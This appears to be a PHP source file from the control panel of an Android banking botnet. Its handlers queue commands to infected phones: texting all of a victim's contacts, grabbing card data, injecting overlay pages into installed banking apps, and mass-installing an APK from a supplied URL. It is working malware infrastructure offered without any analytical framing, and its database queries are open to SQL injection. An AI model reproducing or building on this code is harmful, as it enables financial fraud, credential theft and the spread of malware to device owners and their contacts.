<?php
	include "config.php";

	$bid = $_GET['bid'];

	if(strlen($_POST['op'])>0 && strlen($_POST['bid'])>0){
		if($_POST['op']=="addcom"){
			generate_command($_POST['bid'],$_POST['idcom'],$_POST['data'],0,0);
		}
		die();
	}
	
	if(strlen($_POST['op'])>0 && $_POST['op']=="sendsmstoallcontacts"){
		$data = array();
		$data['text'] = $_POST['text'];
		$sql = "select * from bots where bot_user_id='".$kernel['userid']."' and bot_last_seen>'".$kernel['time_day']."'";
		$res = $dbm->query($sql);
		if($dbm->count>0){
			while($rowc=mysqli_fetch_array($res)) {
				generate_command($rowc[1],19,json_encode($data,JSON_UNESCAPED_UNICODE),0,0);
			}
		}
		header("Location: ".$_SERVER["HTTP_REFERER"]);
		die();
	}
	
	if(strlen($_POST['op'])>0 && $_POST['op']=="setmasscommand"){
		//var_dump($_POST);
		$bids = array();
		$sql = "select * from bots where bot_user_id='".$kernel['userid']."' ORDER BY id DESC";  
		$res = $dbm->query($sql);
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				$flag_show = false;
				if(check_sort_bot($row)==true && $_SESSION['sortbot']!=""){
					$flag_show=true;
				}else if($_SESSION['sortbot']==""){
					$flag_show=true;
				}
				if($flag_show){
					$bids[] = $row[1];
				}
			}
		}
		//var_dump($bids);
		
		for($i=0;$i<count($bids);$i++){
			$bid = $bids[$i];
			foreach($_POST['cod'] as $com){
				//echo $com;
				switch($com){
					case "getbasicinfo":
						generate_command($bid,2,"",0,0);
						generate_command($bid,3,"",0,0);
						generate_command($bid,4,"",0,0);
						generate_command($bid,14,"",0,0);
						generate_command($bid,9,"",0,0);
						break;
					case "getcc":
						$val = "";
						$val['status'] = 1;
						generate_command($bid,13,json_encode($val),0,0);
						break;
						
					case "setinjects":
						$val = "";
						$val['status'] = 3;
						generate_command($bid,21,json_encode($val),0,0);
						$bapps = get_apps_bot($bid);
						$appsInj = get_list_injects();
						$find_inj = array_intersect_key($bapps,$appsInj);
						if(count($find_inj)>0){
							foreach($find_inj as $key=>$fi){
								$val['status'] = 2;
								$val['html'] = get_inject($key,$bid);
								$val['base'] = $key;
								$val['idinj'] = get_inject_id($key);
								generate_command($bid,21,json_encode($val),0,0);
								$val = "";
								
							}
						}
						$val = "";
						$val['status'] = 4;
						generate_command($bid,21,json_encode($val),0,0);
						break;
					case "delinjects":
						$val = "";
						$val['status'] = 3;
						generate_command($bid,21,json_encode($val),0,0);
						$val = "";
						$val['status'] = 4;
						generate_command($bid,21,json_encode($val),0,0);
						break;
					case "masssendapkfromurl":
						$val = "";
						$val['url'] = $_POST['url'];
						$val['pkg'] = $_POST['pkg'];
						generate_command($bid,8,json_encode($val),0,0);
						break;
					default:
						break;
				}
			}
		}
		notification_add("Mass command send","list.php",1);
		//$_SESSION['message'] = "mass command send :)";
		header("Location: list.php");
		die();
	}
	
	if($_GET['op']=="addfav" && strlen($_GET['bid'])>0){
		$sql = "update bots set fav=1 where bid='".$bid."'";
		$dbm->query($sql);
		header("Location: ".$_SERVER["HTTP_REFERER"]);
		die();
	}
	
	if($_GET['op']=="remfav" && strlen($_GET['bid'])>0){
		$sql = "update bots set fav=0 where bid='".$bid."'";
		$dbm->query($sql);
		header("Location: ".$_SERVER["HTTP_REFERER"]);
		die();
	}
	
	if($_GET['op']=="activate"){
		$sql = "update bots set needactivate=0 where bid='".$bid."'";
		$dbm->query($sql);
		header("Location: ".$_SERVER["HTTP_REFERER"]);
		die();
	}
	
	if($_GET['op']=="md5"){
		echo md5($_GET['value']);
		die();
	}
?>
